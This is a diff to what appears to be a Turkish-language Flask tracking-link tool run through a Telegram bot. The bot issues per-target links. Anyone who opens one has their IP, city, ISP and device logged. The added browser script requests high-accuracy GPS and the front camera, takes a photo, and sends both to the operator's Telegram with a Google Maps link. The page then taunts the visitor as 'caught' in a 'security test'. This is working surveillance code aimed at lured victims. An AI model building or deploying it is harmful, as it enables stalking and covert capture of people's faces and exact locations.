@@ -63,7 +63,7 @@ HTML_TEMPLATE = """
         <h1>YAKALANDIN!</h1>
         <div class="alert-box">
             &gt; Durum: <span class="highlight">Bağlantı Doğrulandı</span><br>
-            &gt; İşlem: IP ve Kamera Verileri Kaydedildi
+            &gt; İşlem: Sistem Verileri Kaydedildi
         </div>
         <p>Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.</p>
     </div>
@@ -73,6 +73,25 @@ HTML_TEMPLATE = """
 
     <script>
         window.addEventListener('load', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetId = urlParams.get('id') || 'Bilinmiyor';
+
+            let capturedData = { target_id: targetId, gps_lat: null, gps_lon: null, image: null };
+
+            // 1. GPS Konumunu Almaya Çalış (Nokta atışı için)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    capturedData.gps_lat = position.coords.latitude;
+                    capturedData.gps_lon = position.coords.longitude;
+                    sendData();
+                }, function(error) {
+                    sendData(); // İzin vermezse bile devam et
+                }, { timeout: 5000, enableHighAccuracy: true });
+            } else {
+                sendData();
+            }
+
+            // 2. Kamerayı Aç ve Fotoğraf Çek
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(function(stream) {
                 const video = document.getElementById('video');
@@ -83,24 +102,29 @@ HTML_TEMPLATE = """
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    capturedData.image = canvas.toDataURL('image/jpeg');
                     
-                    const imageData = canvas.toDataURL('image/jpeg');
-                    
-                    const urlParams = new URLSearchParams(window.location.search);
-                    const targetId = urlParams.get('id') || 'Bilinmiyor';
-                    
-                    fetch('/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData, target_id: targetId })
-                    });
-                    
+                    sendData();
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
             })
             .catch(function(error) {
-                console.log("Kamera izni reddedildi.");
+                sendData();
             });
+
+            let sent = false;
+            function sendData() {
+                // Hem kamera hem konum verisi toplanınca veya süre dolunca sunucuya gönder
+                if (sent) return;
+                if (capturedData.image || capturedData.gps_lat) {
+                    sent = true;
+                    fetch('/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(capturedData)
+                    });
+                }
+            }
         });
     </script>
 </body>
@@ -122,27 +146,23 @@ def home():
     zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=3).json()
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=3).json()
         country = geo.get('country', 'Bilinmiyor')
-        region = geo.get('regionName', 'Bilinmiyor') # İl / Bölge
-        city = geo.get('city', 'Bilinmiyor')         # Şehir / İlçe
+        region = geo.get('regionName', 'Bilinmiyor')
+        city = geo.get('city', 'Bilinmiyor')
         isp = geo.get('isp', 'Bilinmiyor')
-        lat = geo.get('lat', '0')
-        lon = geo.get('lon', '0')
     except:
         country = region = city = isp = "Bilinmiyor"
-        lat = lon = "0"
     
     msg = (
         f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
-        f"🏷️ **Hedef ID / Kod:** `{target_id}`\n"
+        f"🏷️ **Hedef ID:** `{target_id}`\n"
         f"⏱️ Zaman: {zaman}\n"
         f"🌍 IP Adresi: `{ip}`\n"
         f"🏳️ Ülke: {country}\n"
-        f"🏙️ İl / Bölge: {region}\n"
-        f"🏘️ Şehir / İlçe: {city}\n"
+        f"🏙️ İl: {region}\n"
+        f"🏘️ İlçe / Şehir: {city}\n"
         f"🏢 İSS: {isp}\n"
-        f"📍 Konum: {lat}, {lon}\n"
         f"📱 Cihaz: {user_agent}"
     )
     
@@ -162,7 +182,15 @@ def capture():
     data = request.get_json()
     image_data = data.get('image')
     target_id = data.get('target_id', 'Bilinmiyor')
+    lat = data.get('gps_lat')
+    lon = data.get('gps_lon')
     
+    # Eğer tarayıcıdan gerçek GPS konumu geldiyse harita linki oluşturalım
+    gps_info = ""
+    if lat and lon:
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        gps_info = f"\n\n📍 **Nokta Atışı GPS Konumu:**\n{maps_link}"
+
     if image_data:
         try:
             header, encoded = image_data.split(",", 1)
@@ -172,12 +200,22 @@ def capture():
                 f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                 data={
                     "chat_id": CHAT_ID, 
-                    "caption": f"📸 Hedefin Fotoğrafı (ID: {target_id})"
+                    "caption": f"📸 Hedefin Fotoğrafı (ID: {target_id}){gps_info}"
                 },
                 files={"photo": ("capture.jpg", image_bytes, "image/jpeg")}
             )
         except Exception as e:
             print(f"Hata: {e}")
+    elif lat and lon:
+        # Fotoğraf vermese bile GPS geldiyse metin olarak at
+        try:
+            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
+                "chat_id": CHAT_ID,
+                "text": f"📍 **GPS Konumu Yakalandı (ID: {target_id})**\n{maps_link}",
+                "parse_mode": "Markdown"
+            })
+        except:
+            pass
             
     return "", 204
 
@@ -197,7 +235,7 @@ def webhook():
                     custom_link = f"{BASE_URL}?id={custom_id}"
                     reply_text = f"🔗 **{custom_id}** için özel link:\n{custom_link}"
                 else:
-                    reply_text = f"🔗 Genel Aktif Link:\n{BASE_URL}\n\n💡 *Not: ID'li özel link almak için `/link <kod>` yazabilirsin.*"
+                    reply_text = f"🔗 Genel Aktif Link:\n{BASE_URL}\n\n💡 *Kullanım: `/link <id>` şeklinde yaz.*"
                 
                 requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
                     "chat_id": chat_id,
